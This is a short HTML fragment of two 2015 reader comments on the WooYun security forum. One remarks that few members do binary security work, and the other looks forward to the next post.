src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夸父追日</span> <span class="reply-time">2015-10-15 10:13:30</span></div><p></p><p>wooyun中搞二进制的人还是很少的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fuckadmin</span> <span class="reply-time">2015-10-14 16:11:55</span></div><p></p><p>期待下一篇~</p><p></p></div></div></div></div></div></main>
